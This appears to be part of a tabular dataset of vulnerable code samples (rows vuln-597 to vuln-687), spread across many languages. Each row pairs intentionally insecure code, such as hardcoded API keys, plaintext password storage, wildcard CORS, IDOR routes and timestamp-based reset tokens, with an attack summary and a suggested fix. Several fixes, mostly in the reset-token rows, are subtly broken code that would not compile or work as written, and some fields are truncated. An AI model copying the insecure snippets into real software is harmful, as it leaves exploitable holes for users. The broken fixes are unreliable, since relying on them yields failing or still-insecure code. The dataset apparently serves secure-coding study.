vuln-597,Perl,Insecure Cache Control,No cache control headers for sensitive data.,$r->print(encode_json($user));,Retrieve cached sensitive data.,"Set: $r->headers_out->set('Cache-Control' => 'no-store, no-cache, private');",$r->print(encode_json($user));,False,False,False,False,30,False,False,False,Other,1
vuln-598,Node.js,Insecure API Key Exposure,Hardcoding API keys in source code.,"const apiKey = '1234567890abcdef'; axios.get('https://api.com', { headers: { 'Authorization': apiKey } });",Extract keys from source code or logs.,Use environment variables: process.env.API_KEY,const apiKey = '1234567890abcdef'; axios.get('https:,False,False,False,False,106,False,True,False,Other,1
vuln-599,Python,Insecure API Key Exposure,Hardcoding API keys in code.,"API_KEY = '1234567890abcdef'; requests.get('https://api.com', headers={'Authorization': API_KEY})",Steal keys from source code.,Use: os.getenv('API_KEY'),API_KEY = '1234567890abcdef'; requests.get('https:,False,False,False,False,97,False,True,False,Other,1
vuln-600,Java,Insecure API Key Exposure,Hardcoding API keys in source code.,"String apiKey = ""1234567890abcdef""; HttpClient.get(""https://api.com"", headers(""Authorization"", apiKey));",Extract keys from code or logs.,"Use: System.getenv(""API_KEY"")","String apiKey = ""1234567890abcdef""; HttpClient.get(""https:",False,False,False,False,104,False,True,False,Other,1
vuln-601,PHP,Insecure API Key Exposure,Hardcoding API keys in source code.,"$apiKey = '1234567890abcdef'; $ch = curl_init('https://api.com'); curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: ' . $apiKey]);",Extract keys from source code or logs.,Use environment variables: getenv('API_KEY'),$apiKey = '1234567890abcdef'; $ch = curl_init('https:,False,False,False,False,134,False,True,False,Other,1
vuln-602,Ruby,Insecure API Key Exposure,Hardcoding API keys in code.,"API_KEY = '1234567890abcdef'; HTTParty.get('https://api.com', headers: { 'Authorization' => API_KEY })",Steal keys from source code.,Use: ENV['API_KEY'],API_KEY = '1234567890abcdef'; HTTParty.get('https:,False,False,False,False,102,False,True,False,Other,1
vuln-603,Go,Insecure API Key Exposure,Hardcoding API keys in source code.,"apiKey := ""1234567890abcdef""; req, _ := http.NewRequest(""GET"", ""https://api.com"", nil); req.Header.Add(""Authorization"", apiKey)",Extract keys from code or logs.,"Use: os.Getenv(""API_KEY"")","apiKey := ""1234567890abcdef""; req, _ := http.NewRequest(""GET"", ""https:",True,False,False,False,127,False,True,False,Other,1
vuln-604,C# (.NET),Insecure API Key Exposure,Hardcoding API keys in code.,"string apiKey = ""1234567890abcdef""; var client = new HttpClient(); client.DefaultRequestHeaders.Add(""Authorization"", apiKey);",Steal keys from source code.,"Use: Environment.GetEnvironmentVariable(""API_KEY"")","string apiKey = ""1234567890abcdef""; var client = new HttpClient(); client.DefaultRequestHeaders.Add(""Authorization"", apiKey);",False,False,False,False,125,False,True,False,Other,1
vuln-605,Kotlin,Insecure API Key Exposure,Hardcoding API keys in source code.,"val apiKey = ""1234567890abcdef""; val client = HttpClient().get(""https://api.com"") { header(""Authorization"", apiKey) }",Extract keys from code or logs.,"Use: System.getenv(""API_KEY"")","val apiKey = ""1234567890abcdef""; val client = HttpClient().get(""https:",False,False,False,False,117,False,True,False,Other,1
vuln-606,Scala,Insecure API Key Exposure,Hardcoding API keys in code.,"val apiKey = ""1234567890abcdef""; WS.url(""https://api.com"").withHeaders(""Authorization"" -> apiKey).get()",Steal keys from source code.,"Use: sys.env(""API_KEY"")","val apiKey = ""1234567890abcdef""; WS.url(""https:",False,False,False,False,103,False,True,False,Other,1
vuln-607,Rust,Insecure API Key Exposure,Hardcoding API keys in source code.,"let api_key = ""1234567890abcdef""; let client = reqwest::Client::new().get(""https://api.com"").header(""Authorization"", api_key);",Extract keys from code or logs.,"Use: std::env::var(""API_KEY"")","let api_key = ""1234567890abcdef""; let client = reqwest::Client::new().get(""https:",False,False,False,False,126,False,True,False,Other,1
vuln-608,Elixir,Insecure API Key Exposure,Hardcoding API keys in code.,"api_key = ""1234567890abcdef""; HTTPoison.get!(""https://api.com"", [{""Authorization"", api_key}])",Steal keys from source code.,"Use: System.get_env(""API_KEY"")","api_key = ""1234567890abcdef""; HTTPoison.get!(""https:",False,False,False,False,93,False,True,False,Other,1
vuln-609,Perl,Insecure API Key Exposure,Hardcoding API keys in source code.,"my $api_key = '1234567890abcdef'; my $ua = LWP::UserAgent->new; $ua->get('https://api.com', Authorization => $api_key);",Extract keys from code or logs.,Use: $ENV{'API_KEY'},my $api_key = '1234567890abcdef'; my $ua = LWP::UserAgent->new; $ua->get('https:,False,False,False,False,119,False,True,False,Other,1
vuln-610,Node.js,Insecure Password Storage,Storing passwords in plain text.,user.password = req.body.password; db.save(user);,Steal passwords from database breaches.,"Use bcrypt: bcrypt.hash(req.body.password, 10).then(hash => db.save({ ...user, password: hash }))",user.password = req.body.password; db.save(user);,True,False,False,False,49,False,False,False,Other,1
vuln-611,Python,Insecure Password Storage,Storing plain text passwords.,user['password'] = request.form['password']; db.insert(user),Access plain text passwords from database.,"Use bcrypt: user['password'] = bcrypt.hashpw(request.form['password'].encode(), bcrypt.gensalt())",user['password'] = request.form['password']; db.insert(user),False,True,False,False,60,False,True,False,Other,1
vuln-612,Java,Insecure Password Storage,Storing passwords in plain text.,"user.setPassword(request.getParameter(""password"")); userRepository.save(user);",Extract plain passwords from database.,"Use BCrypt: user.setPassword(BCrypt.hashpw(request.getParameter(""password""), BCrypt.gensalt()))","user.setPassword(request.getParameter(""password"")); userRepository.save(user);",True,False,False,False,78,False,True,False,Other,1
vuln-613,PHP,Insecure Password Storage,Storing plain text passwords.,$user['password'] = $_POST['password']; $db->insert($user);,Steal passwords from database.,"Use password_hash: $user['password'] = password_hash($_POST['password'], PASSWORD_BCRYPT);",$user['password'] = $_POST['password']; $db->insert($user);,False,True,False,False,59,False,True,False,Other,1
vuln-614,Ruby,Insecure Password Storage,Storing plain text passwords.,user.password = params[:password]; user.save,Access plain passwords from database.,Use bcrypt: user.password = BCrypt::Password.create(params[:password]),user.password = params[:password]; user.save,True,False,False,False,44,False,False,False,Other,1
vuln-615,Go,Insecure Password Storage,Storing passwords in plain text.,"user.Password = r.FormValue(""password""); db.Save(&user)",Steal passwords from database breaches.,"Use bcrypt: hash, _ := bcrypt.GenerateFromPassword([]byte(r.FormValue(""password"")), bcrypt.DefaultCost)","user.Password = r.FormValue(""password""); db.Save(&user)",False,False,False,False,55,False,True,False,Other,1
vuln-616,C# (.NET),Insecure Password Storage,Storing plain text passwords.,user.Password = model.Password; await db.SaveAsync(user);,Extract plain passwords from database.,Use BCrypt: user.Password = BCrypt.Net.BCrypt.HashPassword(model.Password),user.Password = model.Password; await db.SaveAsync(user);,False,False,False,False,57,False,False,False,Other,1
vuln-617,Kotlin,Insecure Password Storage,Storing passwords in plain text.,"user.password = call.request.queryParameters[""password""]; userRepo.save(user)",Steal passwords from database.,"Use BCrypt: user.password = BCrypt.hashpw(call.request.queryParameters[""password""], BCrypt.gensalt())","user.password = call.request.queryParameters[""password""]; userRepo.save(user)",True,True,False,False,77,False,True,False,Other,1
vuln-618,Scala,Insecure Password Storage,Storing plain text passwords.,"user.password = params(""password""); userRepo.save(user)",Access plain passwords from database.,"Use bcrypt: user.password = BCrypt.hashpw(params(""password""), BCrypt.gensalt())","user.password = params(""password""); userRepo.save(user)",True,False,False,False,55,False,True,False,Other,1
vuln-619,Rust,Insecure Password Storage,Storing passwords in plain text.,user.password = req.form::<User>().await?.password; db.save(user).await;,Steal passwords from database.,"Use bcrypt: user.password = bcrypt::hash(req.form::<User>().await?.password, DEFAULT_COST)?;",user.password = req.form::<User>().await?.password; db.save(user).await;,True,False,False,False,72,False,False,False,Other,1
vuln-620,Elixir,Insecure Password Storage,Storing plain text passwords.,"user = %{password: params[""password""]}; Repo.insert(user)",Extract plain passwords from database.,"Use Bcrypt: user = %{password: Bcrypt.hash_pwd_salt(params[""password""])}","user = %{password: params[""password""]}; Repo.insert(user)",True,True,False,False,57,False,True,False,Other,1
vuln-621,Perl,Insecure Password Storage,Storing plain text passwords.,$user->{password} = $r->param('password'); $db->insert($user);,Steal passwords from database.,Use Crypt::Bcrypt: $user->{password} = bcrypt($r->param('password'));,$user->{password} = $r->param('password'); $db->insert($user);,True,True,False,False,62,False,True,False,Other,1
vuln-622,Node.js,Insecure Direct Object Reference,Exposing internal IDs in URLs.,"app.get('/user/:id', (req, res) => db.findById(req.params.id));",Access unauthorized records by guessing IDs.,Validate access: if (req.user.id === req.params.id) db.findById(req.params.id),"app.get('/user/:id', (req, res) => db.findById(req.params.id));",True,False,False,False,63,False,True,False,Other,1
vuln-623,Python,Insecure Direct Object Reference,Exposing database IDs in routes.,@app.route('/user/<id>') def get_user(id): return db.get(id),Access records by iterating IDs.,Check permissions: if current_user.id == id: return db.get(id),@app.route('/user/<id>') def get_user(id): return db.get(id),False,False,False,False,60,False,True,False,Other,1
vuln-624,Java,Insecure Direct Object Reference,Exposing internal IDs in endpoints.,"@GetMapping(""/user/{id}"") public User getUser(@PathVariable Long id) { return userRepo.findById(id); }",Access unauthorized data by guessing IDs.,Validate: if (authUser.getId().equals(id)) return userRepo.findById(id);,"@GetMapping(""/user/{id}"") public User getUser(@PathVariable Long id) { return userRepo.findById(id); }",False,False,False,False,102,False,True,False,Other,1
vuln-625,PHP,Insecure Direct Object Reference,Exposing database IDs in URLs.,"$id = $_GET['id']; $user = $db->query(""SELECT * FROM users WHERE id = $id"");",Access records by manipulating IDs.,Validate: if ($loggedInUser['id'] == $id) $db->query(...);,"$id = $_GET['id']; $user = $db->query(""SELECT * FROM users WHERE id = $id"");",True,True,False,False,76,False,True,False,Other,1
vuln-626,Ruby,Insecure Direct Object Reference,Exposing internal IDs in routes.,get '/user/:id' do User.find(params[:id]).to_json end,Access unauthorized records via ID guessing.,Validate: User.find(params[:id]) if current_user.id == params[:id],get '/user/:id' do User.find(params[:id]).to_json end,True,False,False,False,53,False,True,False,Other,1
vuln-627,Go,Insecure Direct Object Reference,Exposing database IDs in endpoints.,"http.HandleFunc(""/user"", func(w http.ResponseWriter, r *http.Request) { id := r.URL.Query().Get(""id""); db.Find(id) })",Access records by guessing IDs.,Validate: if user.ID == id { db.Find(id) },"http.HandleFunc(""/user"", func(w http.ResponseWriter, r *http.Request) { id := r.URL.Query().Get(""id""); db.Find(id) })",True,True,False,False,117,False,True,False,Other,1
vuln-628,C# (.NET),Insecure Direct Object Reference,Exposing internal IDs in routes.,"[HttpGet(""user/{id}"")] public IActionResult GetUser(int id) { return Ok(db.Find(id)); }",Access unauthorized data by ID manipulation.,Validate: if (User.Identity.Id == id) return Ok(db.Find(id));,"[HttpGet(""user/{id}"")] public IActionResult GetUser(int id) { return Ok(db.Find(id)); }",False,False,False,False,87,False,True,False,Other,1
vuln-629,Kotlin,Insecure Direct Object Reference,Exposing database IDs in endpoints.,"get(""/user/{id}"") { call.respond(userRepo.findById(call.parameters[""id""]!!)) }",Access records by guessing IDs.,"Validate: if (call.user.id == call.parameters[""id""]) userRepo.findById(...)","get(""/user/{id}"") { call.respond(userRepo.findById(call.parameters[""id""]!!)) }",True,False,False,False,78,False,True,False,Other,1
vuln-630,Scala,Insecure Direct Object Reference,Exposing internal IDs in routes.,"get(""/user/:id"") { userRepo.find(params(""id"").toLong) }",Access unauthorized data via ID guessing.,"Validate: if (authUser.id == params(""id"").toLong) userRepo.find(...)","get(""/user/:id"") { userRepo.find(params(""id"").toLong) }",True,False,False,False,55,False,True,False,Other,1
vuln-631,Rust,Insecure Direct Object Reference,Exposing database IDs in endpoints.,"router.get(""/user/:id"", |req, res| db.find(req.param(""id"")?.parse()?))",Access records by manipulating IDs.,"Validate: if user.id == req.param(""id"")?.parse()? { db.find(...) }","router.get(""/user/:id"", |req, res| db.find(req.param(""id"")?.parse()?))",True,False,False,False,70,False,True,False,Other,1
vuln-632,Elixir,Insecure Direct Object Reference,Exposing internal IDs in routes.,"get ""/user/:id"", UserController, :show",Access unauthorized records via ID guessing.,"Validate: if conn.assigns.current_user.id == params[""id""] do Repo.get(User, id) end","get ""/user/:id"", UserController, :show",False,False,False,False,38,False,True,False,Other,1
vuln-633,Perl,Insecure Direct Object Reference,Exposing database IDs in URLs.,"my $id = $r->param('id'); my $user = $db->select(""SELECT * FROM users WHERE id = ?"", $id);",Access records by guessing IDs.,Validate: if ($logged_in_user->{id} eq $id) { $db->select(...) },"my $id = $r->param('id'); my $user = $db->select(""SELECT * FROM users WHERE id = ?"", $id);",True,True,False,False,90,False,True,False,Other,1
vuln-634,Node.js,Insecure CORS Configuration,Allowing all origins in CORS policy.,app.use(cors({ origin: '*' }));,Make unauthorized cross-origin requests.,Restrict origins: cors({ origin: 'https://mydomain.com' }),app.use(cors({ origin: '*' }));,False,False,False,False,31,False,True,False,Configuration,1
vuln-635,Python,Insecure CORS Configuration,Allowing all origins in CORS.,"app.add_middleware(CORSMiddleware, allow_origins=['*'])",Perform cross-origin attacks.,Restrict: allow_origins=['https://mydomain.com'],"app.add_middleware(CORSMiddleware, allow_origins=['*'])",False,False,False,False,55,False,True,False,Configuration,1
vuln-636,Java,Insecure CORS Configuration,Allowing all origins in CORS policy.,"@CrossOrigin(origins = ""*"") @GetMapping(""/api"") public Data getData() { ... }",Make unauthorized CORS requests.,"Restrict: @CrossOrigin(origins = ""https://mydomain.com"")","@CrossOrigin(origins = ""*"") @GetMapping(""/api"") public Data getData() { ... }",False,False,False,False,77,False,True,False,Configuration,1
vuln-637,PHP,Insecure CORS Configuration,Allowing all origins in CORS headers.,header('Access-Control-Allow-Origin: *');,Perform cross-origin attacks.,Restrict: header('Access-Control-Allow-Origin: https://mydomain.com');,header('Access-Control-Allow-Origin: *');,False,False,False,False,41,False,True,False,Configuration,1
vuln-638,Ruby,Insecure CORS Configuration,Allowing all origins in CORS.,response.headers['Access-Control-Allow-Origin'] = '*',Make unauthorized CORS requests.,Restrict: response.headers['Access-Control-Allow-Origin'] = 'https://mydomain.com',response.headers['Access-Control-Allow-Origin'] = '*',False,False,False,False,53,False,True,False,Configuration,1
vuln-639,Go,Insecure CORS Configuration,Allowing all origins in CORS policy.,"w.Header().Set(""Access-Control-Allow-Origin"", ""*"")",Perform cross-origin attacks.,"Restrict: w.Header().Set(""Access-Control-Allow-Origin"", ""https://mydomain.com"")","w.Header().Set(""Access-Control-Allow-Origin"", ""*"")",False,False,False,False,50,False,True,False,Configuration,1
vuln-640,C# (.NET),Insecure CORS Configuration,Allowing all origins in CORS.,"services.AddCors(options => options.AddPolicy(""AllowAll"", builder => builder.AllowAnyOrigin()));",Make unauthorized CORS requests.,"Restrict: builder.WithOrigins(""https://mydomain.com"")","services.AddCors(options => options.AddPolicy(""AllowAll"", builder => builder.AllowAnyOrigin()));",False,False,False,False,96,False,True,False,Configuration,1
vuln-641,Kotlin,Insecure CORS Configuration,Allowing all origins in CORS policy.,install(CORS) { anyHost() },Perform cross-origin attacks.,"Restrict: hosts = listOf(""https://mydomain.com"")",install(CORS) { anyHost() },False,False,False,False,27,False,False,False,Configuration,1
vuln-642,Scala,Insecure CORS Configuration,Allowing all origins in CORS.,"response.withHeaders(""Access-Control-Allow-Origin"" -> ""*"")",Make unauthorized CORS requests.,"Restrict: response.withHeaders(""Access-Control-Allow-Origin"" -> ""https://mydomain.com"")","response.withHeaders(""Access-Control-Allow-Origin"" -> ""*"")",False,False,False,False,58,False,True,False,Configuration,1
vuln-643,Rust,Insecure CORS Configuration,Allowing all origins in CORS policy.,"res.header(""Access-Control-Allow-Origin"", ""*"")",Perform cross-origin attacks.,"Restrict: res.header(""Access-Control-Allow-Origin"", ""https://mydomain.com"")","res.header(""Access-Control-Allow-Origin"", ""*"")",False,False,False,False,46,False,True,False,Configuration,1
vuln-644,Elixir,Insecure CORS Configuration,Allowing all origins in CORS.,"plug CORSPlug, origin: ""*""",Make unauthorized CORS requests.,"Restrict: plug CORSPlug, origin: ""https://mydomain.com""","plug CORSPlug, origin: ""*""",False,False,False,False,26,False,True,False,Configuration,1
vuln-645,Perl,Insecure CORS Configuration,Allowing all origins in CORS headers.,$r->headers_out->set('Access-Control-Allow-Origin' => '*');,Perform cross-origin attacks.,Restrict: $r->headers_out->set('Access-Control-Allow-Origin' => 'https://mydomain.com');,$r->headers_out->set('Access-Control-Allow-Origin' => '*');,False,False,False,False,59,False,True,False,Configuration,1
vuln-646,Node.js,Insecure Session Regeneration,Not regenerating session IDs after login.,"app.post('/login', (req, res) => { req.session.user = user; });",Reuse stolen session IDs post-login.,Regenerate: req.session.regenerate(() => { req.session.user = user; }),"app.post('/login', (req, res) => { req.session.user = user; });",True,False,False,False,63,False,True,False,Authentication,1
vuln-647,Python,Insecure Session Regeneration,No session ID regeneration after login.,"@app.route('/login', methods=['POST']) def login(): session['user'] = user",Hijack sessions using old IDs.,Regenerate: session.regenerate(),"@app.route('/login', methods=['POST']) def login(): session['user'] = user",False,False,False,False,74,False,True,False,Authentication,1
vuln-648,Java,Insecure Session Regeneration,Not regenerating session after authentication.,"HttpSession session = request.getSession(); session.setAttribute(""user"", user);",Reuse pre-login session IDs.,Regenerate: request.getSession().invalidate(); request.getSession(true);,"HttpSession session = request.getSession(); session.setAttribute(""user"", user);",False,False,False,False,79,False,True,False,Authentication,1
vuln-649,PHP,Insecure Session Regeneration,No session regeneration after login.,session_start(); $_SESSION['user'] = $user;,Hijack sessions with old IDs.,Regenerate: session_regenerate_id(true);,session_start(); $_SESSION['user'] = $user;,False,False,False,False,43,False,True,False,Authentication,1
vuln-650,Ruby,Insecure Session Regeneration,Not regenerating session IDs post-login.,post '/login' do session[:user] = user end,Reuse stolen session IDs.,Regenerate: reset_session; session[:user] = user,post '/login' do session[:user] = user end,False,False,False,False,42,False,True,False,Authentication,1
vuln-651,Go,Insecure Session Regeneration,No session ID regeneration after login.,"session.Values[""user""] = user; session.Save(r, w)",Hijack sessions using old IDs.,"Regenerate: session.Options.MaxAge = -1; session.Save(r, w); session = sessions.NewSession(...)","session.Values[""user""] = user; session.Save(r, w)",False,False,False,False,49,False,True,False,Authentication,1
vuln-652,C# (.NET),Insecure Session Regeneration,Not regenerating session after login.,"HttpContext.Session.SetString(""user"", user);",Reuse pre-login session IDs.,Regenerate: HttpContext.Session.Clear(); await HttpContext.Session.CommitAsync();,"HttpContext.Session.SetString(""user"", user);",False,False,False,False,44,False,True,False,Authentication,1
vuln-653,Kotlin,Insecure Session Regeneration,No session ID regeneration post-login.,call.sessions.set(UserSession(user)),Hijack sessions with old IDs.,Regenerate: call.sessions.clear<UserSession>(); call.sessions.set(UserSession(user)),call.sessions.set(UserSession(user)),False,False,False,False,36,False,False,False,Authentication,1
vuln-654,Scala,Insecure Session Regeneration,Not regenerating session IDs after login.,"Ok.withSession(""user"" -> user.id.toString)",Reuse stolen session IDs.,"Regenerate: Ok.withNewSession.withSession(""user"" -> user.id.toString)","Ok.withSession(""user"" -> user.id.toString)",False,False,False,False,42,False,True,False,Authentication,1
vuln-655,Rust,Insecure Session Regeneration,No session regeneration after login.,"req.session()?.set(""user"", user)?;",Hijack sessions using old IDs.,"Regenerate: req.session()?.clear(); req.session()?.set(""user"", user)?;","req.session()?.set(""user"", user)?;",True,False,False,False,34,False,True,False,Authentication,1
vuln-656,Elixir,Insecure Session Regeneration,Not regenerating session IDs post-login.,"put_session(conn, :user, user)",Reuse stolen session IDs.,"Regenerate: conn |> clear_session() |> put_session(:user, user)","put_session(conn, :user, user)",False,False,False,False,30,False,False,False,Authentication,1
vuln-657,Perl,Insecure Session Regeneration,No session ID regeneration after login.,$r->session->{user} = $user;,Hijack sessions with old IDs.,Regenerate: $r->session->expire; $r->session->{user} = $user;,$r->session->{user} = $user;,False,False,False,False,28,False,False,False,Authentication,1
vuln-658,Node.js,Insecure Content Security Policy,Overly permissive CSP allowing unsafe scripts.,"app.use((req, res) => res.set('Content-Security-Policy', ""default-src *""));",Inject malicious scripts via permissive CSP.,"Set strict CSP: res.set('Content-Security-Policy', ""default-src 'self'"")","app.use((req, res) => res.set('Content-Security-Policy', ""default-src *""));",False,False,False,False,75,False,True,False,Other,1
vuln-659,Python,Insecure Content Security Policy,Permissive CSP allowing unsafe sources.,"response.headers['Content-Security-Policy'] = ""default-src *""",Execute malicious scripts via loose CSP.,"Set: response.headers['Content-Security-Policy'] = ""default-src 'self'""","response.headers['Content-Security-Policy'] = ""default-src *""",False,False,False,False,61,False,True,False,Other,1
vuln-660,Java,Insecure Content Security Policy,Overly permissive CSP configuration.,"response.setHeader(""Content-Security-Policy"", ""default-src *"");",Inject scripts via permissive CSP.,"Set: response.setHeader(""Content-Security-Policy"", ""default-src 'self'"")","response.setHeader(""Content-Security-Policy"", ""default-src *"");",False,False,False,False,63,False,True,False,Other,1
vuln-661,PHP,Insecure Content Security Policy,Permissive CSP allowing unsafe sources.,header('Content-Security-Policy: default-src *');,Execute malicious scripts via CSP.,Set: header('Content-Security-Policy: default-src \'self\'');,header('Content-Security-Policy: default-src *');,False,False,False,False,49,False,True,False,Other,1
vuln-662,Ruby,Insecure Content Security Policy,Overly permissive CSP.,response.headers['Content-Security-Policy'] = 'default-src *',Inject scripts via loose CSP.,Set: response.headers['Content-Security-Policy'] = 'default-src \'self\'',response.headers['Content-Security-Policy'] = 'default-src *',False,False,False,False,61,False,True,False,Other,1
vuln-663,Go,Insecure Content Security Policy,Permissive CSP allowing unsafe sources.,"w.Header().Set(""Content-Security-Policy"", ""default-src *"")",Execute malicious scripts via CSP.,"Set: w.Header().Set(""Content-Security-Policy"", ""default-src 'self'"")","w.Header().Set(""Content-Security-Policy"", ""default-src *"")",False,False,False,False,58,False,True,False,Other,1
vuln-664,C# (.NET),Insecure Content Security Policy,Overly permissive CSP configuration.,"Response.Headers.Add(""Content-Security-Policy"", ""default-src *"");",Inject scripts via permissive CSP.,"Set: Response.Headers.Add(""Content-Security-Policy"", ""default-src 'self'"");","Response.Headers.Add(""Content-Security-Policy"", ""default-src *"");",False,False,False,False,65,False,True,False,Other,1
vuln-665,Kotlin,Insecure Content Security Policy,Permissive CSP allowing unsafe sources.,"call.response.header(""Content-Security-Policy"", ""default-src *"")",Execute malicious scripts via CSP.,"Set: call.response.header(""Content-Security-Policy"", ""default-src 'self'"")","call.response.header(""Content-Security-Policy"", ""default-src *"")",False,False,False,False,64,False,True,False,Other,1
vuln-666,Scala,Insecure Content Security Policy,Overly permissive CSP.,"Ok.withHeaders(""Content-Security-Policy"" -> ""default-src *"")",Inject scripts via loose CSP.,"Set: Ok.withHeaders(""Content-Security-Policy"" -> ""default-src 'self'"")","Ok.withHeaders(""Content-Security-Policy"" -> ""default-src *"")",False,False,False,False,60,False,True,False,Other,1
vuln-667,Rust,Insecure Content Security Policy,Permissive CSP allowing unsafe sources.,"res.header(""Content-Security-Policy"", ""default-src *"")",Execute malicious scripts via CSP.,"Set: res.header(""Content-Security-Policy"", ""default-src 'self'"")","res.header(""Content-Security-Policy"", ""default-src *"")",False,False,False,False,54,False,True,False,Other,1
vuln-668,Elixir,Insecure Content Security Policy,Overly permissive CSP configuration.,"put_resp_header(conn, ""content-security-policy"", ""default-src *"")",Inject scripts via permissive CSP.,"Set: put_resp_header(conn, ""content-security-policy"", ""default-src 'self'"")","put_resp_header(conn, ""content-security-policy"", ""default-src *"")",False,False,False,False,65,False,True,False,Other,1
vuln-669,Perl,Insecure Content Security Policy,Permissive CSP allowing unsafe sources.,$r->headers_out->set('Content-Security-Policy' => 'default-src *');,Execute malicious scripts via CSP.,Set: $r->headers_out->set('Content-Security-Policy' => 'default-src \'self\'');,$r->headers_out->set('Content-Security-Policy' => 'default-src *');,False,False,False,False,67,False,True,False,Other,1
vuln-670,Node.js,Insecure Password Reset Token,Predictable password reset tokens.,const token = user.id + '-' + Date.now();,Guess tokens to reset passwords.,Use: crypto.randomBytes(32).toString('hex'),const token = user.id + '-' + Date.now();,False,False,False,False,41,False,True,True,Authentication,1
vuln-671,Python,Insecure Password Reset Token,Predictable reset tokens using timestamps.,token = f'{user.id}-{int(time.time())}',Predict tokens based on user ID and time.,Use: secrets.token_hex(32),token = f'{user.id}-{int(time.time())}',False,False,False,False,39,False,True,False,Authentication,1
vuln-672,Java,Insecure Password Reset Token,Predictable password reset tokens.,"String token = user.getId() + ""-"" + System.currentTimeMillis();",Guess tokens to hijack reset process.,Use SecureRandom: new SecureRandom().nextBytes(new byte[32]).toString(),"String token = user.getId() + ""-"" + System.currentTimeMillis();",False,False,False,True,63,False,True,True,Authentication,1
vuln-673,PHP,Insecure Password Reset Token,Predictable reset tokens.,$token = $user['id'] . '-' . time();,Predict tokens based on ID and timestamp.,Use: bin2hex(random_bytes(32)),$token = $user['id'] . '-' . time();,False,False,False,False,36,False,True,False,Authentication,1
vuln-674,Ruby,Insecure Password Reset Token,Predictable password reset tokens.,"token = ""#{user.id}-#{Time.now.to_i}""",Guess tokens to reset passwords.,Use: SecureRandom.hex(32),"token = ""#{user.id}-#{Time.now.to_i}""",False,False,False,False,37,False,True,False,Authentication,1
vuln-675,Go,Insecure Password Reset Token,Predictable reset tokens using timestamps.,"token := fmt.Sprintf(""%d-%d"", user.ID, time.Now().Unix())",Predict tokens based on user ID and time.,Use crypto/rand: hex.EncodeToString(crypto.Read(new byte[32])),"token := fmt.Sprintf(""%d-%d"", user.ID, time.Now().Unix())",False,False,False,False,57,False,True,False,Authentication,1
vuln-676,C# (.NET),Insecure Password Reset Token,Predictable password reset tokens.,"var token = $""{user.Id}-{DateTime.Now.Ticks}"";",Guess tokens to hijack reset process.,Use RNGCryptoServiceProvider: Convert.ToBase64String(new byte[32].GetBytes()),"var token = $""{user.Id}-{DateTime.Now.Ticks}"";",False,False,False,False,46,False,True,False,Authentication,1
vuln-677,Kotlin,Insecure Password Reset Token,Predictable reset tokens.,"val token = ""${user.id}-${System.currentTimeMillis()}""",Predict tokens based on ID and timestamp.,Use SecureRandom: SecureRandom().nextBytes(ByteArray(32)).toHex(),"val token = ""${user.id}-${System.currentTimeMillis()}""",False,False,False,True,54,False,True,True,Authentication,1
vuln-678,Scala,Insecure Password Reset Token,Predictable password reset tokens.,"val token = s""${user.id}-${System.currentTimeMillis()}""",Guess tokens to reset passwords.,Use SecureRandom: java.security.SecureRandom().nextBytes(new Array[Byte](32)).toHex,"val token = s""${user.id}-${System.currentTimeMillis()}""",False,False,False,True,55,False,True,True,Authentication,1
vuln-679,Rust,Insecure Password Reset Token,Predictable reset tokens.,"let token = format!(""{}-{}"", user.id, SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs());",Predict tokens based on ID and time.,Use: rand::crypto::SystemRandom.fill(&mut [0u8; 32]).to_hex(),"let token = format!(""{}-{}"", user.id, SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs());",False,False,False,True,95,False,True,False,Authentication,1
vuln-680,Elixir,Insecure Password Reset Token,Predictable password reset tokens.,"token = ""#{user.id}-#{:os.system_time(:second)}""",Guess tokens to hijack reset process.,Use: :crypto.strong_rand_bytes(32) |> Base.encode16(),"token = ""#{user.id}-#{:os.system_time(:second)}""",False,False,False,True,48,False,True,False,Authentication,1
vuln-681,Perl,Insecure Password Reset Token,Predictable reset tokens.,"my $token = ""$user->{id}-"" . time();",Predict tokens based on ID and timestamp.,Use: Crypt::Random::Source::random_bytes(32)->hex;,"my $token = ""$user->{id}-"" . time();",False,False,False,False,36,False,True,False,Authentication,1
vuln-682,Node.js,Insecure HTTP Method Handling,Allowing unsafe HTTP methods.,"app.all('/api/*', (req, res) => handleRequest(req));",Use TRACE or PUT to bypass restrictions.,"Restrict methods: app.use('/api/*', (req, res, next) => { if (['GET', 'POST'].includes(req.method)) next(); else res.status(405); })","app.all('/api/*', (req, res) => handleRequest(req));",False,False,False,False,52,False,True,False,Other,1
vuln-683,Python,Insecure HTTP Method Handling,Allowing all HTTP methods.,"@app.route('/api/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'TRACE'])",Exploit TRACE or PUT for attacks.,"Restrict: methods=['GET', 'POST']","@app.route('/api/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'TRACE'])",False,False,False,False,81,False,True,False,Other,1
vuln-684,Java,Insecure HTTP Method Handling,Allowing unsafe HTTP methods.,"@RequestMapping(""/api"") public Response handleAll(HttpServletRequest request) { ... }",Use TRACE or PUT to bypass controls.,"Restrict: @RequestMapping(value = ""/api"", method = {RequestMethod.GET, RequestMethod.POST})","@RequestMapping(""/api"") public Response handleAll(HttpServletRequest request) { ... }",False,False,False,False,85,False,True,False,Other,1
vuln-685,PHP,Insecure HTTP Method Handling,Allowing all HTTP methods.,"if (in_array($_SERVER['REQUEST_URI'], ['/api'])) { handleRequest(); }",Exploit TRACE or PUT methods.,"Restrict: if (in_array($_SERVER['REQUEST_METHOD'], ['GET', 'POST'])) { handleRequest(); }","if (in_array($_SERVER['REQUEST_URI'], ['/api'])) { handleRequest(); }",False,False,False,False,69,False,True,False,Other,1
vuln-686,Ruby,Insecure HTTP Method Handling,Allowing unsafe HTTP methods.,"match '/api/*path', to: 'api#handle', via: :all",Use TRACE or PUT to bypass restrictions.,"Restrict: match '/api/*path', to: 'api#handle', via: [:get, :post]","match '/api/*path', to: 'api#handle', via: :all",False,False,False,False,47,False,True,False,Other,1
vuln-687,Go,Insecure HTTP Method Handling,Allowing all HTTP methods.,"http.HandleFunc(""/api"", handleRequest)",Exploit TRACE or PUT methods.,"Restrict: http.HandleFunc(""/api"", func(w http.ResponseWriter, r *http.Request) { if r.Method == ""GET"" || r.Method == ""POST"" { handleRequest(w, r) } })","http.HandleFunc(""/api"", handleRequest)",False,False,False,False,38,False,True,False,Other,1
